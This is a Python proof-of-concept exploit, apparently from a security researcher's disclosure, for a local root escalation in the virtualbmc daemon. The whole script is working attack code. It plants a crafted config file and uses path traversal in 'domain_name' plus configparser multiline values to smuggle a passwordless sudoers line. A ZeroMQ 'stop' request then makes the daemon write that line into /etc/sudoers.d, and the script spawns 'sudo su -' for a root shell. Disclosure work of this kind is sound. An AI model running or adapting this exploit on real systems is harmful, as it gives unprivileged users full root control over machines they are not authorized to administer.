#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# Date: 2025-11-27
#
# This is a proof of concept (PoC) for a local root exploit vulnerability in
# the virtualbmc service.
#
# The service accepts requests from arbitrary local users on localhost and
# fails to verify input arguments, which allows to craft an /etc/sudoers.d
# drop-in configuration file, granting the caller full root privileges via
# `sudo`.

import argparse
import getpass
import json
import os
import pprint
import subprocess
import sys
import zmq


def assert_vbmcd_running():
    res = subprocess.call(["pgrep", "vbmcd"], stdout=subprocess.DEVNULL)
    if res != 0:
        print("It seems the vbmcd service is not running. Try `systemctl start virtualbmc.service` as root", file=sys.stderr)
        sys.exit(1)


def create_fake_config():
    DOMAIN="evil-bmc"
    home = os.environ["HOME"]
    fake_config_dir = f"{home}/{DOMAIN}"
    os.makedirs(fake_config_dir, exist_ok=True)
    # The daemon will write the new configuration state into the directory
    # stated as `domain_name` below. Only the [VirtualBMC] section and an
    # explicit list of keys (see `VBMC_OPTIONS`) in that section will be
    # written back to the new configuration file.
    # Thus we have only limited degree of freedom in crafting the output.
    #
    # For exploiting via `sudo` we need to achieve that a single valid sudoers
    # configuration line appears in that file. The multiline feature from
    # Python's configparser comes to the rescue here. The multilines will be
    # preserved when the new configuration file is written, thus allowing us
    # to create a valid sudoers configuration line that starts with some
    # whitespace at the front.
    fake_config = f"""
[VirtualBMC]
domain_name = ../../etc/sudoers.d
port = 1234
active = true
address = some
  evil stuff
  {getpass.getuser()} ALL=(ALL:ALL) NOPASSWD: ALL
"""

    with open(f"{fake_config_dir}/config", 'w') as fl:
        fl.write(fake_config)

    # We return the path which needs to be passed as "domain name" to the
    # daemon.
    # For a given domain name the daemon looks up its "trusted" configuration
    # in "/root/.vbmc/<domain>/config", by default.
    # Thus, to trick the daemon into opening our attacker controller config
    # file we need to add two ".." components to reach the root file system,
    # then enter our own home directory, only then the actual domain name.
    #
    # This lets the daemon open the file we just created above.
    return f"../../{home}/{DOMAIN}"


assert_vbmcd_running()
crafted_domain_name = create_fake_config()

PORT = 50891

# create zeromq connection towards virtualbmc
ctx = zmq.Context()
socket = ctx.socket(zmq.REQ)
socket.connect(f"tcp://127.0.0.1:{PORT}")

# for the exploit we simply send a stop command.
#
# for this to work, the fake configuration above needs to claim that the
# domain is currently "active = true".
# 
# the daemon will see a change in configuration and attempt to write out the
# updated configuration into the crafted location we state in the
# "domain_name" of the crafted configuration file.
req = {
        "command": "stop",
        "port": 4711,
        "domain_name": crafted_domain_name,
        "domain_names": [crafted_domain_name],
}

out = json.dumps(req)
socket.send(out.encode())
print("Outgoing request:")
pprint.pprint(out)

resp = socket.recv()
print("\nReceived", len(resp), "bytes:\n")
resp = json.loads(resp.decode())
pprint.pprint(resp)
print()

if resp['rc'] != 0:
    print("API call failed, exploit likely did not work", file=sys.stderr)
    sys.exit(1)

print("API call succeeded")
print("We are now trying to obtain a root shell via sudo without entering a password.")
print("A number of sudoers parse errors are expected to occur, but the exploit should still work")

cmdline = ["sudo", "su", "-"]
print(' '.join(cmdline))
print('\n' * 3)
subprocess.call(cmdline)
